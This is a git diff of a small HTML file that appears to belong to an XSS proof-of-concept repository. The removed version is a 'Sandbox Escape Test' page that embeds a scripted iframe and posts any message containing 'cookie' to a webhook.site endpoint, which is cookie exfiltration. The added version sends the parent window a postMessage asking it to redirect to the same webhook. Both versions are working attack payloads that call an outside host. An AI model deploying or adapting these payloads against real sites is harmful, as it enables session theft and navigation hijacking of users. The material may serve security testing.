@@ -1,52 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>🚨 Sandbox Escape Test</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      margin: 2em;
-    }
-    .group {
-      border: 1px solid #ccc;
-      padding: 1em;
-      border-radius: 8px;
-      background: #f9f9f9;
-    }
-    .label {
-      font-weight: bold;
-      margin-bottom: 0.5em;
-    }
-    iframe {
-      width: 100%;
-      height: 300px;
-      border: none;
-    }
-  </style>
-</head>
-<body>
-  <div class="group">
-    <div class="label">🚨 Sandbox Escape Test</div>
-    <iframe src="https://baali07.github.io/XSS-PoC/dn.html" sandbox="allow-scripts allow-same-origin"></iframe>
-  </div>
-
-  <script>
-    window.addEventListener("message", (event) => {
-      try {
-        if (typeof event.data === 'string' && event.data.includes("cookie")) {
-          fetch("https://webhook.site/dc178026-0966-4143-8ebd-d4ec82a2bd6f", {
-            method: "POST",
-            body: event.data,
-            headers: {
-              "Content-Type": "text/plain"
-            }
-          });
-        }
-      } catch (e) {
-        console.error("Error handling message:", e);
-      }
-    });
-  </script>
-</body>
+<html>
+  <body>
+    <script>
+      // إرسال رسالة إلى الصفحة الأم تطلب redirect
+      window.parent.postMessage(
+        {
+          typ: "redirect",
+          url: "https://webhook.site/dc178026-0966-4143-8ebd-d4ec82a2bd6f"
+        },
+        "*"
+      );
+    </script>
+  </body>
 </html>
